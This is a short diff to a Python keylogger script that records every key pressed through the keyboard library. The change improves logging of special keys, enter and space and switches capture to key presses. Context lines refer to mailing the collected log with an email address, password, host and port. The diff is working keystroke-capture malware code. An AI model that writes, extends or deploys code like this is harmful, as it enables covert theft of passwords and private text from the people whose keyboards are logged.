@@ -17,8 +17,12 @@ if use_mail :
 
 def recorder(event):
 	global log
-	if event =="space":
-		log+=event.name
+	if event.name in keyboard.all_modifiers or event.name in ("backspace","caps lock","esc","tab"):
+		log+=" <Special Key> "
+	elif event.name == "enter":
+		log+=" <new line> "
+	elif event.name =="space":
+		log+=" "
 	else:
 		log += event.name
 
@@ -56,5 +60,5 @@ def pack():
 #pack(duration,folder_name,use_mail,email,passwd,host,port)
 pack()
 
-data = keyboard.on_release(callback=recorder)
+data = keyboard.on_press(callback=recorder)
 keyboard.wait("ctrl+shift+r")
